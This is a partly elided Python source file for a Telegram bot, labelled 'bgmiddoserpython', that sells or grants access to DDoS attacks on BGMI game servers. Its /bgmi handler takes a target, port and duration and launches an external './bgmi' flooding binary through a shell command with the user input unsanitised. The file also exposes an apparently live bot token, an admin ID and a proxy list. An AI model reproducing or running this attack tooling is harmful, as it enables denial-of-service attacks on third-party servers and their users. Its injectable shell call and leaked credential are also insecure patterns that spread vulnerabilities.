...
# @NARUTOPPKING TELEGRAM #bgmiddoserpython
...
# @NARUTOPPKING TELEGRAM #from keep_alive import keep_alive
# @NARUTOPPKING TELEGRAM #keep_alive()
# @NARUTOPPKING TELEGRAM # insert your Telegram bot token here
bot = telebot.TeleBot('6899588941:AAGp3DK3ELgaQHnHbB3HSMes0HajDtbHTmY')

# @NARUTOPPKING TELEGRAM # Admin user IDs
admin_id = ["2104190309"]

# @NARUTOPPKING TELEGRAM # File to store allowed user IDs
USER_FILE = "users.txt"

# @NARUTOPPKING TELEGRAM # File to store command logs
LOG_FILE = "log.txt"


# @NARUTOPPKING TELEGRAM # List of proxy addresses
PROXIES = [
...
"https://134.73.65.97:6649"
    # @NARUTOPPKING TELEGRAM # Add more proxy addresses as needed
]
...
# @NARUTOPPKING TELEGRAM # Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # @NARUTOPPKING TELEGRAM # Check if line is not empty
...
# @NARUTOPPKING TELEGRAM # Function to log command to the file
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # @NARUTOPPKING TELEGRAM # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# @NARUTOPPKING TELEGRAM # Function to clear logs
def clear_logs():
    try:
...
# @NARUTOPPKING TELEGRAM # Function to record command logs
...
# @NARUTOPPKING TELEGRAM # Function to handle the reply when free users run the /bgmi command
...
# @NARUTOPPKING TELEGRAM # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# @NARUTOPPKING TELEGRAM # Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # @NARUTOPPKING TELEGRAM # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # @NARUTOPPKING TELEGRAM # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 120:
                ...
                bot.reply_to(message, response)
                return
            # @NARUTOPPKING TELEGRAM # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # @NARUTOPPKING TELEGRAM # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # @NARUTOPPKING TELEGRAM # Convert time to integer
            time = int(command[3])  # @NARUTOPPKING TELEGRAM # Convert port to integer
            if time > 240:
                response = "Error: Time interval must be less than 250."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # @NARUTOPPKING TELEGRAM # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 500"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # @NARUTOPPKING TELEGRAM # Updated command syntax
    else:
...
# @NARUTOPPKING TELEGRAM # Add /mylogs command to display logs recorded for bgmi and website commands
...
# @NARUTOPPKING TELEGRAM # Import the 'time' module for sleep functionality
import time
